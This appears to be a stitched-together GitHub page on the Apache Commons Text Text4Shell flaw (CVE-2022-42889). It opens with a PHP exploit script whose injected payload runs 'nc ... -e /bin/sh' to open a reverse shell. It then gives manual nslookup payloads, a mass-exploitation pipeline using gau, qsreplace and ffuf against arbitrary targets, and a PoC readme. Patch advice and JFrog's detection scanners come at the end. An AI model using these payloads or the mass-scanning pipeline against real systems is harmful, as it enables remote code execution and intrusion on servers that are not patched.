# CVE-2022-42889-text4shell 🔥🔥🔥


https://github.com/korteke/CVE-2022-42889-POC


#
##
#


  <?php



  function create_payload($ip, $port, $type){
	  $cmd = "nc $ip $port -e $type";
	  $payload = '${script:javascript:java.lang.Runtime.getRuntime().exec(\''.trim($cmd).'\')}';
	  return urlencode($payload);
    }

  ## add {{exploit}} string to value in vulnerable parmater
  $url = "http://localhost/text4shell/attack?search={{exploit}}";
  $ip = "172.17.0.1";
  $port = 1337;
  $type = "/bin/sh";


  $payload = create_payload($ip, $port, $type);

  file_get_contents(str_replace("{{exploit}}", $payload, $url));

  //system("nc -nlvp 1337")

  ?>

##
##
##
##

Apache commons text  - CVE-2022-42889 Text4Shell proof of concept exploit.
## Details📃
CVE-2022-42889 affects Apache Commons Text versions 1.5 through 1.9. It has been patched as of Commons Text version 1.10


The vulnerability has been compared to Log4Shell since it is an open-source library-level vulnerability that is likely to impact a wide variety of software applications that use the relevant object.
However, initial analysis indicates that this is a bad comparison. The nature of the vulnerability means that unlike Log4Shell, it will be rare that an application uses the vulnerable component of Commons Text to process untrusted, potentially malicious input.
### Technical analysis
The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.

While this specific code fragment is unlikely to exist in production applications, the concern is that in some applications, the `pocstring` variable may be attacker-controlled. In this sense, the vulnerability echoes Log4Shell. However, the StringSubstitutor interpolator is considerably less widely used than the vulnerable string substitution in Log4j and the nature of such an interpolator means that getting crafted input to the vulnerable object is less likely than merely interacting with such a crafted string as in Log4Shell.

## Exploitation👨‍💻

### Manual🛠️
**script:javascript**

Replace parameter value with payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}
```
```
https://your-target.com/exploit?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7
```

**url**
```
${url:UTF-8:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}
```
```
https://your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7
```

**dns**
```
${dns:address:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}
```
```
https://your-target.com/exploit?search=%24%7Bdns%3Aaddress%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7

```

### Mass exploitation ⛓️

[payloads.txt](https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt)
```
${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}

${url:UTF-8:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}

${dns:address:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}
```
```
for payload in $(cat payloads.txt|sed 's/ COLLABORATOR-HERE/SPACEid.burpcollaborator.com/g'); do echo TARGET.com | gau --blacklist ttf,woff,svg,png | qsreplace "$payload" | sed 's/SPACE/%20/g' | grep "java.lang.Runtime.getRuntime" >> payloads-final.txt;done && ffuf -w payloads-final.txt -u FUZZ
```

#### Happy huting!💸

### Requirements🧰

[ffuf](https://github.com/ffuf/ffuf)
Thanks [@joohoi](https://github.com/joohoi)!

[qsreplace](https://github.com/tomnomnom/qsreplace)
Thanks [@tomnomnom](https://github.com/tomnomnom)

[gau](https://github.com/lc/gau)
Thanks [@lc](https://github.com/lc)

## Contact Me📇

[Twitter - Milan Jovic](https://twitter.com/milanshiftsec)

[LinkedIn - Milan Jovic](https://www.linkedin.com/in/milan-jovic-sec/)

[ShiftSecurityConsulting](https://shiftsecurityconsulting.com)




CVE-2022-42889 PoC
This is Proof of Concept for the vulnerability CVE-2022-42889. This code will run the JavaScript code 195 + 324. If vulnerable the output should be:

PoC Output: 519
In order to run this you will need:

JDK 11 or above
Maven
When prompted for an exploit string, you can either provide your own exploit string (and hit Enter to enter the string), or simply hit Enter to use the default exploit string of ${script:javascript:195 + 324}.

Docker
Alternatively you can use Docker to be able to run this PoC:

docker build -t poc .
docker run -it poc
What's the Issue?
The issue stems from the fact that the following keys should not be interpolated by default (as per the documentation https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html):

script
dns
url
script
This lookup allows the supplied JavaScript code to be executed. The result is the ability for an attacker to be able to arbitary code on the system.

Format
${script:<engine>:<code>}
Example
${script:javascript:java.lang.Runtime.getRuntime().exec('mkdir poc-test')}
Example in PoC:

Enter your exploit string (press Enter to use the default of '${script:javascript:195 + 324}'): 
${script:javascript:java.lang.Runtime.getRuntime().exec("mkdir poc-test")}
Warning: Nashorn engine is planned to be removed from a future JDK release
===================================================================================================================
Exploiting PoC with the exploit string '${script:javascript:java.lang.Runtime.getRuntime().exec("mkdir poc-test")}'
===================================================================================================================
PoC Output:
-------------------------------------------------------------------------------------------------------------------
Process[pid=67, exitValue=0]
===================================================================================================================
url
This lookup calls the specified url. An attacker could leverage this to be able to perform basic GET requests to internal resources.

Format
${url:<character-encoding>:<url>}
Example
${url:UTF-8::https://internal-jenkins.companyx.net/}
Example in PoC:

Enter your exploit string (press Enter to use the default of '${script:javascript:195 + 324}'): 
${url:UTF-8:https://www.google.com/}
===================================================================================================================
Exploiting PoC with the exploit string '${url:UTF-8:https://www.google.com/}'
===================================================================================================================
PoC Output:
-------------------------------------------------------------------------------------------------------------------
<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="en-GB"><head>
....
</body></html>
===============================================================================================
dns
This lookup performs a DNS query, or a reverse lookup. This could allow an attacker to be able to identify internal resources.

Format
${dns:<address,canonical-name,name>|<host>}
Example
${dns:address|internal-jenkins.companyx.net}
Example in PoC:

Enter your exploit string (press Enter to use the default of '${script:javascript:195 + 324}'): 
${dns:address|www.google.com}                                                         
===================================================================================================================
Exploiting PoC with the exploit string '${dns:address|www.google.com}'
===================================================================================================================
PoC Output:
-------------------------------------------------------------------------------------------------------------------
142.250.200.4
===================================================================================================================
However due to a flaw in the logic, these 3 keys are interpolated by default, when they should not (since they could represent a security risk).

What's the Risk?
An attacker with control over the string passed into an affected StringSubstitutor replace could allow the attacker to:

Run JavaScript code on the system (typically a server) executing the StringSubstitutor code
Connect to other servers from the affected system
Potentially gain access to other remote resources from the affected system
Am I Vulnerable?
In order for your code to be vulnerable you need to:

Be running a version of Apache commons-text from version 1.5.0 up to (and not including) 1.10.0

Using Interpolation for your StringSubstituion (see https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html)

Note that in JDK 15 and later the JavaScript engine Nashorn is no longer included. However, the JEXL engine is still included and as a result RCE may still be possible.

(kudos to rgmz for highlighting this)

Official Fix
The fix for this is to update your instances of commons-text to versions 1.10.0 or later.

Note
The other default lookups could still potentially represent a security risk (such as the ability to read content of files, read system properies, etc). Use this feature with caution and make sure that all user input appropriately sanitised (for example passing through an allow list).

##
##
	
# commons-text-tools

### Overview

CVE-2022-42889 may pose a serious threat to a wide range of Java-based applications. The important questions a developer may ask in this context are:

### 1. Does my code include `commons-text`? Which versions?

Does the released code include `commons-text`? Which version of the library is included there? Answering these questions may not be immediate due to two factors:

1) Transitive dependencies: while `commons-text` may not be in the direct dependency list of the project, it may be used indirectly by some other dependency.

2) The code of this library may not appear directly as a separate file, but rather be bundled in some other code jar file.

JFrog is releasing a tool to help resolve this problem: [`scan_commons_text_versions`](#scan_commons_text_versionspy). The tool looks for the **class code** of `StringLookupFactory`  **(regardless of containing `.jar` file names and content of `pom.xml` files)**, and attempts to fingerprint the versions of the objects to report whether the included version of `commons-text` is vulnerable.

### 2. Does my code use vulnerable `commons-text` functions? 

The question is relevant for the cases where the developer would like to verify if the calls to `commons-text` in the codebase may pass potentially attacker-controlled data. While the safest way to fix the vulnerability, as discussed in the advisories, is to apply the appropriate patches, controlling for and verifying the potential impact under assumption of unpatched `commons-text` may be valuable in many situations. 

[`scan_commons_text_calls_jar.py`](#scan_commons_text_calls_jarpy), which locates the calls to the vulnerable functions in *compiled .jar*s, and reports the findings as class name and method names in which each call appears.


##### Usage
### `scan_commons_text_versions.py`

```
python scan_commons_text_versions.py root-folder [-quiet] [-exclude folder1 folder2 ..]
```

The tool will scan `root_folder` recursively for `.jar` and `.war` files; in each located file the tool looks for a `StringLookupFactory.class` (recursively in each `.jar` file). If at least one of the classes is found, the tool attempts to fingerprint its version (including some variations found in patches and backport patches) in order to report whether the code is vulnerable.

With `-quiet` flag, only version conclusions are printed out, and other messages (files not found/ archives failed to open/ password protected archives) are muted.

Folders appearing after `-exclude` (optional) are skipped.

------

### `scan_commons_text_calls_jar.py`

The tool requires python 3 and the following 3rd party libraries: `jawa`, `tqdm`, `easyargs`, `colorama`

##### Dependencies installation

```
pip install -r requirements.txt
```

##### Usage

The default use case:

```
python scan_commons_text_calls_jar.py root-folder
```

will recursively scan all `.jar` files in `root-folder`, for each printing out locations (class name and method name) of calls to `lookup`/`replace`/`replaceIn` methods of `StringSubstitutor`/`StringLookup`. 

The tool may be configured for additional use cases using the following command line flags.

| Flag                  | Default value        | Use                                                          |
| --------------------- | -------------------- | ------------------------------------------------------------ |
| `--class_regex`       | (.*StringSubstitutor&#124;.*StringLookup)       | Regular expression for required class name                   |
| `--method_regex`      | (lookup&#124;replace&#124;replaceIn)                 | Regular expression for required method name                  |
| `--quickmatch_string` | (StringLookup&#124;StringSubstitutor)                | Pre-condition for file analysis: .jar files not containing the specified regex will be ignored |
| `--class_existence`   | Not set              | When not set, look for calls to class::method as  specified by regexes. When set, `--method_regex` is ignored, and the tool will look for *existence* of classes specified by `--class_regex` in the jar. |
| `--no_quickmatch`     | Not set              | When set, the value of `--quickmatch_string` is ignored and all jar files are analyzed |
| `--caller_block`      | .*org/apache/commons/text | If caller class matches this regex, it will *not* be displayed |


	
